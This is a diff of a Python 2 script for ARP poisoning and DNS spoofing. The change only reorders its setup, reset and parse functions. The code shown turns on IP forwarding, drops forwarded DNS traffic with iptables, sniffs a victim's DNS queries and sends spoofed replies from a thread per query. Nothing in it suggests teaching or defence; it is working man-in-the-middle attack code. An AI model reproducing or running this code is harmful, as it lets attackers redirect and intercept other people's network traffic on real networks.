@@ -39,18 +39,6 @@ localMAC = ""
 victimMAC = ""
 routerMAC = ""
 
-#Setup function
-def setup():
-    #setup forwarding rules
-    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
-    #disable forwarding of DNS requests to router
-    #iptables rule
-    Popen(["iptables -A FORWARD -p UDP --dport 53 -j DROP"], shell=True, stdout=PIPE)
-
-#invoked on user exit. Flush iptables rules
-def reset():
-    Popen(["iptables -F"], shell=True, stdout=PIPE)
-
 #get MACaddress of local machine
 def getOurMAC(interface):
     try:
@@ -90,13 +78,6 @@ def ARPpoison(localMAC, victimMAC, routerMAC):
         except KeyboardInterrupt:
             sys.exit(0)
 
-#this parse creates a thread
-def parse(packet):
-
-    if packet.haslayer(DNS) and packet.getlayer(DNS).qr==0:
-        respondThread = threading.Thread(target=respond, args=packet)
-        respondThread.start()
-
 #construct and send a spoofed DNS response packet to the victim
 def respond(packet):
     global targetIP
@@ -108,12 +89,31 @@ def respond(packet):
     #print "Received: "+ str(targetIP)
     return
 
+#this parse creates a thread
+def parse(packet):
+
+    if packet.haslayer(DNS) and packet.getlayer(DNS).qr==0:
+        respondThread = threading.Thread(target=respond, args=packet)
+        respondThread.start()
+
 #initiate sniff filter for DNS requests
 def DNSsniffer():
     global victimIP
     print "Sniffing DNS Requests"
     sniffFilter = "udp and port 53 and src " +str(victimIP)
     sniff(filter=sniffFilter, prn=parse)
+
+#invoked on user exit. Flush iptables rules
+def reset():
+    Popen(["iptables -F"], shell=True, stdout=PIPE)
+
+#Setup function
+def setup():
+    #setup forwarding rules
+    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
+    #disable forwarding of DNS requests to router
+    #iptables rule
+    Popen(["iptables -A FORWARD -p UDP --dport 53 -j DROP"], shell=True, stdout=PIPE)
 
 def main():
     setup()
